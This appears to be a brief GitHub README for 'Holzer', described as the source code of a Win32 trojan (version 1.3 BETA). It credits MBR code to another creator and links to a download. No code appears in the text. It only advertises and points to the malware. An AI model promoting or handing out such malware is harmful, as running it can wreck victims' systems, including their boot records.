# Holzer's Source Code
Holzer Win32 trojan's source code. Version: 1.3 BETA

The MBR code is from SleepMod (https://www.youtube.com/watch?v=MNUQkq1N8R0).

Download Holzer: https://github.com/zDominik111/Holzer
